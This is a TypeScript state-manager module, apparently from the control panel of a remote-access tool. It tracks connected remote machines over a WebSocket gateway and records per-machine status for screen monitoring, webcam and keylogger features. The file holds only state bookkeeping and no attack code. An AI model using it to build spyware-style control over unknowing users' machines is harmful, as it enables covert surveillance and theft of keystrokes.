/**
 * State Manager - Global application state
 */

import type { GatewayWsClient } from './WebSocketClient';

export interface Backend {
  id: number;
  status: 'online' | 'offline';
  name?: string;
  os?: string;
  lastSeen: number;
}

export interface ClientState {
  monitor: 'idle' | 'starting' | 'active';
  webcam: 'idle' | 'starting' | 'active';
  keylogger: 'idle' | 'starting' | 'active';
}

interface AppState {
  clientId: number;
  activeBackendId: number | null;
  backends: Map<number, Backend>;
  clientStates: Map<number, ClientState>;
  wsClient: GatewayWsClient | null;
}

const state: AppState = {
  clientId: 0,
  activeBackendId: null,
  backends: new Map(),
  clientStates: new Map(),
  wsClient: null,
};

export const StateManager = {
  // WebSocket Client
  setWsClient(client: GatewayWsClient | null): void {
    state.wsClient = client;
  },

  getWsClient(): GatewayWsClient | null {
    return state.wsClient;
  },

  // Client ID
  setClientId(id: number): void {
    state.clientId = id;
  },

  getClientId(): number {
    return state.clientId;
  },

  // Active Backend
  setActiveBackend(id: number | null): void {
    state.activeBackendId = id;
  },

  getActiveBackend(): number | null {
    return state.activeBackendId;
  },

  getActiveBackendData(): Backend | undefined {
    if (state.activeBackendId === null) return undefined;
    return state.backends.get(state.activeBackendId);
  },

  // Backends
  addBackend(id: number): void {
    if (!state.backends.has(id)) {
      state.backends.set(id, {
        id,
        status: 'online',
        lastSeen: Date.now(),
      });
      // Initialize client state
      state.clientStates.set(id, {
        monitor: 'idle',
        webcam: 'idle',
        keylogger: 'idle',
      });
    } else {
      const backend = state.backends.get(id)!;
      backend.status = 'online';
      backend.lastSeen = Date.now();
    }
  },

  updateBackend(id: number, updates: Partial<Backend>): void {
    const backend = state.backends.get(id);
    if (backend) {
      Object.assign(backend, updates);
    }
  },

  removeBackend(id: number): void {
    state.backends.delete(id);
    state.clientStates.delete(id);
  },

  getBackends(): Backend[] {
    return Array.from(state.backends.values());
  },

  getBackend(id: number): Backend | undefined {
    return state.backends.get(id);
  },

  // Client State (per backend)
  getClientState(id: number): ClientState {
    return state.clientStates.get(id) || {
      monitor: 'idle',
      webcam: 'idle',
      keylogger: 'idle',
    };
  },

  setClientState(id: number, feature: keyof ClientState, value: ClientState[keyof ClientState]): void {
    const clientState = state.clientStates.get(id);
    if (clientState) {
      clientState[feature] = value;
    }
  },

  // Send message to active backend
  sendToActive(message: string): void {
    if (state.activeBackendId !== null && state.wsClient) {
      state.wsClient.sendText(state.activeBackendId, message);
    }
  },

  // Send message to specific backend
  sendTo(id: number, message: string): void {
    if (state.wsClient) {
      state.wsClient.sendText(id, message);
    }
  },
};
